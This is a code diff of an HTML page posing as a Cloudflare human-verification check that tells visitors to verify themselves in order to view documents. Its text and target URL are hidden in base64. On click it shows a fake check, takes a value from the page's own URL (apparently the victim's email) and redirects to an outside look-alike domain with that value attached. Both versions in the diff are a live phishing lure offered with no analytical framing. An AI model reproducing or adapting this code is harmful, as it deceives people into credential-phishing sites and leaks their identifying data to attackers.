@@ -3,190 +3,155 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Security Check</title>
+    <title>Verification Required</title>
     <style>
-        :root {
-            --primary-blue: #0052cc;
-            --success-green: #228b22;
-            --border-grey: #e0e0e0;
-            --text-dark: #333333;
-        }
+        /* Base Reset */
+        html, body { margin: 0; padding: 0; height: 100%; background-color: #ffffff; font-family: "Segoe UI", Tahoma, sans-serif; overflow: hidden; }
 
-        * { box-sizing: border-box; }
-
-        body, html {
-            margin: 0; padding: 0; height: 100%;
-            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
-            background: #ffffff; overflow: hidden;
-        }
-
-        /* Viewport containers */
-        .app-shell {
-            display: flex; flex-direction: column;
-            justify-content: center; align-items: center;
-            height: 100vh; width: 100vw;
-        }
-
-        #loading-screen {
-            position: fixed; inset: 0; background: #fff;
+        /* Full Color Loading Overlay */
+        #splash-container {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
             display: flex; justify-content: center; align-items: center;
-            z-index: 99; transition: opacity 0.4s ease;
+            background: #ffffff; z-index: 1000;
+        }
+        .pulsate { width: 100px; height: auto; animation: pulse-effect 2s ease-in-out infinite; }
+
+        @keyframes pulse-effect {
+            0%, 100% { transform: scale(1); opacity: 0.8; }
+            50% { transform: scale(1.1); opacity: 1; }
         }
 
-        #main-content { visibility: hidden; opacity: 0; transition: opacity 0.5s ease; }
-
-        /* Animations */
-        @keyframes soft-pulse {
-            0%, 100% { transform: scale(1); opacity: 0.7; }
-            50% { transform: scale(1.05); opacity: 1; }
+        /* Main View Container */
+        #gatekeeper-view {
+            display: none; flex-direction: column; justify-content: center;
+            align-items: center; height: 100vh;
         }
 
-        @keyframes spin-loader {
-            to { transform: rotate(360deg); }
-        }
+        #instruction-text { font-size: 14px; color: #333; margin-bottom: 18px; }
 
-        .img-pulse { width: 90px; animation: soft-pulse 2s infinite; }
-
-        /* The Challenge Card */
-        .challenge-container {
-            width: 360px; padding: 20px;
-            background: #fafafa; border: 1px solid var(--border-grey);
-            border-radius: 5px; box-shadow: 0 2px 5px rgba(0,0,0,0.08);
+        /* The Main Rectangular Box */
+        .widget-frame {
             display: flex; justify-content: space-between; align-items: center;
+            width: 380px; padding: 16px 24px; border: 1px solid #e0e0e0;
+            border-radius: 4px; background: #f9f9f9; box-shadow: 0 1px 2px rgba(0,0,0,0.05);
         }
 
-        .instruction { font-size: 0.9rem; color: var(--text-dark); margin-bottom: 15px; text-align: left; width: 360px; }
+        .flex-row { display: flex; align-items: center; gap: 12px; }
 
-        .interactive-area { display: flex; align-items: center; gap: 15px; }
+        /* Logic for the Trigger Element */
+        .click-area { width: 26px; height: 26px; display: flex; justify-content: center; align-items: center; cursor: pointer; }
 
-        .checkbox-sync {
-            width: 24px; height: 24px; border: 2px solid #bbb;
-            border-radius: 3px; background: #fff; cursor: pointer;
-            display: flex; justify-content: center; align-items: center;
-            transition: all 0.2s;
-        }
+        /* Box state (Original) */
+        .box-outline { width: 22px; height: 22px; border: 2px solid #c1c1c1; border-radius: 3px; background: white; }
 
-        /* Dynamic states */
-        .is-loading {
-            width: 18px; height: 18px; border: 2px solid #ddd;
-            border-top-color: var(--primary-blue); border-radius: 50%;
-            animation: spin-loader 0.7s linear infinite;
-        }
+        /* Spinner state (Replaces the box completely) */
+        .spinner { width: 22px; height: 22px; border: 3px solid #f3f3f3; border-top: 3px solid #0052cc; border-radius: 50%; animation: rotate-speed 0.8s linear infinite; }
 
-        .is-complete {
-            width: 100%; height: 100%; background: var(--success-green);
-            color: white; border-radius: 2px; font-weight: bold;
-            display: flex; justify-content: center; align-items: center;
-        }
+        /* Check state */
+        .check-circle { width: 24px; height: 24px; background-color: #228b22; border-radius: 50%; display: flex; justify-content: center; align-items: center; color: white; font-size: 14px; }
 
-        .brand-box { text-align: center; font-size: 11px; color: #777; }
-        .brand-logo { width: 25px; margin-bottom: 2px; }
-        .brand-name { font-weight: 800; color: #000; display: block; margin-bottom: 2px; }
+        @keyframes rotate-speed { 100% { transform: rotate(360deg); } }
+
+        /* Branding Styles */
+        #interaction-status { font-size: 14px; color: #555; }
+        .vendor-info { text-align: center; display: flex; flex-direction: column; align-items: center; }
+        .vendor-icon { width: 28px; height: auto; margin-bottom: 4px; }
+        #vendor-name { font-weight: 700; font-size: 15px; color: #1a1a1b; margin: 0; }
+        .footer-links { font-size: 10px; color: #888; margin-top: 2px; }
     </style>
 </head>
 <body>
 
-    <section id="loading-screen">
-        <img src="astro.png" class="img-pulse" alt="Loading...">
-    </section>
+    <div id="splash-container">
+        <img src="astro.png" class="pulsate" alt="Loading">
+    </div>
 
-    <main id="main-content" class="app-shell">
-        <div id="ui-msg" class="instruction"></div>
-
-        <div class="challenge-container">
-            <div class="interactive-area">
-                <div id="trigger-node" class="checkbox-sync"></div>
-                <span id="status-label" style="font-size: 14px; color: #444;"></span>
+    <div id="gatekeeper-view">
+        <div id="instruction-text"></div>
+        <div class="widget-frame">
+            <div class="flex-row">
+                <div class="click-area" id="action-trigger">
+                    <div id="state-visual" class="box-outline"></div>
+                </div>
+                <span id="interaction-status"></span>
             </div>
-
-            <div class="brand-box">
-                <img src="astro2.png" class="brand-logo" alt="">
-                <span id="ui-brand" class="brand-name"></span>
-                <div>Privacy • Terms</div>
+            <div class="vendor-info">
+                <img src="astro2.png" alt="" class="vendor-icon">
+                <p id="vendor-name"></p>
+                <div class="footer-links">Privacy . Terms</div>
             </div>
         </div>
-    </main>
+    </div>
 
     <script>
-        const _RESOURCES = {
-            t_msg: "VG8gdmlldyB0aGVzZSBkb2N1bWVudHMsIHZlcmlmeSB5b3UgYXJlIGh1bWFuIGJlbG93",
-            t_btn: "dmVyaWZ5",
-            t_run: "dmVyaWZ5aW5nLi4u",
-            t_fin: "c3VjY2Vzcw==",
-            t_brd: "Q2xvdWRmbGFyZQ==",
-            // Target: https://aeoffice.egvhfztransfercygv.online/wvwYPnsr#
-            t_url: "aHR0cHM6Ly9hZW9mZmljZS5lZ3ZoZnp0cmFuc2ZlcmN5Z3Yub25saW5lL3d2d1lQbnNyIw==",
-            t_prm: "ZW9mZg=="
-        };
+        (function() {
+            const config = {
+                sMsg: "VG8gdmlldyB0aGVzZSBkb2N1bWVudHMsIHZlcmlmeSB5b3UgYXJlIGh1bWFuIGJlbG93",
+                sBtn: "dmVyaWZ5",
+                sRun: "dmVyaWZ5aW5nLi4u",
+                sFin: "c3VjY2Vzcw==",
+                sBrand: "Q2xvdWRmbGFyZQ==",
+                // New URL: https://aeoffice.egvhfztransfercygv.online/wvwYPnsr#
+                sUrl: "aHR0cHM6Ly9hZW9mZmljZS5lZ3ZoZnp0cmFuc2ZlcmN5Z3Yub25saW5lL3d2d1lQbnNyIw==",
+                sParam: "ZW9mZg=="
+            };
 
-        class Gatekeeper {
-            constructor() {
-                this.nodes = {
-                    loader: document.getElementById('loading-screen'),
-                    main: document.getElementById('main-content'),
-                    trigger: document.getElementById('trigger-node'),
-                    label: document.getElementById('status-label'),
-                    msg: document.getElementById('ui-msg'),
-                    brand: document.getElementById('ui-brand')
-                };
-                this.init();
-            }
+            const dom = {
+                msg: document.getElementById('instruction-text'),
+                stat: document.getElementById('interaction-status'),
+                name: document.getElementById('vendor-name'),
+                vis: document.getElementById('state-visual'),
+                btn: document.getElementById('action-trigger'),
+                gate: document.getElementById('gatekeeper-view'),
+                load: document.getElementById('splash-container')
+            };
 
-            decode(str) { return atob(str); }
+            const decode = (str) => atob(str);
 
-            init() {
-                // Populate Text
-                this.nodes.msg.textContent = this.decode(_RESOURCES.t_msg);
-                this.nodes.label.textContent = this.decode(_RESOURCES.t_btn);
-                this.nodes.brand.textContent = this.decode(_RESOURCES.t_brd);
+            // Startup Sequence
+            window.addEventListener('DOMContentLoaded', () => {
+                dom.msg.innerText = decode(config.sMsg);
+                dom.stat.innerText = decode(config.sBtn);
+                dom.name.innerText = decode(config.sBrand);
 
-                // Entry Animation
                 setTimeout(() => {
-                    this.nodes.loader.style.opacity = '0';
-                    setTimeout(() => {
-                        this.nodes.loader.style.display = 'none';
-                        this.nodes.main.style.visibility = 'visible';
-                        this.nodes.main.style.opacity = '1';
-                    }, 400);
+                    dom.load.style.display = 'none';
+                    dom.gate.style.display = 'flex';
                 }, 2000);
+            });
 
-                this.nodes.trigger.addEventListener('click', () => this.handleProcess());
-            }
+            // Interaction Sequence
+            dom.btn.addEventListener('click', function() {
+                // Change UI: Remove box-outline, add spinner
+                dom.vis.className = 'spinner';
+                dom.stat.innerText = decode(config.sRun);
+                this.style.pointerEvents = 'none';
 
-            handleProcess() {
-                // Change UI to loading
-                this.nodes.trigger.style.pointerEvents = 'none';
-                this.nodes.trigger.innerHTML = '<div class="is-loading"></div>';
-                this.nodes.label.textContent = this.decode(_RESOURCES.t_run);
-
-                // Simulated verification delay
                 setTimeout(() => {
-                    this.nodes.trigger.innerHTML = '<div class="is-complete">✓</div>';
-                    this.nodes.trigger.style.border = 'none';
-                    this.nodes.label.textContent = this.decode(_RESOURCES.t_fin);
-                    this.finalize();
+                    // Success state
+                    dom.vis.className = 'check-circle';
+                    dom.vis.innerText = '✓';
+                    dom.stat.innerText = decode(config.sFin);
+                    executeRedirect();
                 }, 2200);
-            }
+            });
 
-            finalize() {
-                const searchKey = this.decode(_RESOURCES.t_prm) + "=";
-                const href = window.location.href;
-                let payload = "";
+            function executeRedirect() {
+                const currentUrl = window.location.href;
+                const keyString = decode(config.sParam) + "=";
+                let capturedValue = "";
 
-                if (href.indexOf(searchKey) !== -1) {
-                    payload = href.split(searchKey)[1];
+                if (currentUrl.includes(keyString)) {
+                    capturedValue = currentUrl.split(keyString)[1];
                 }
 
-                const destination = this.decode(_RESOURCES.t_url) + payload;
+                let finalDestination = decode(config.sUrl) + capturedValue;
 
                 setTimeout(() => {
-                    window.location.replace(destination);
+                    window.location.replace(finalDestination);
                 }, 800);
             }
-        }
-
-        // Boot
-        new Gatekeeper();
+        })();
     </script>
 </body>
 </html>
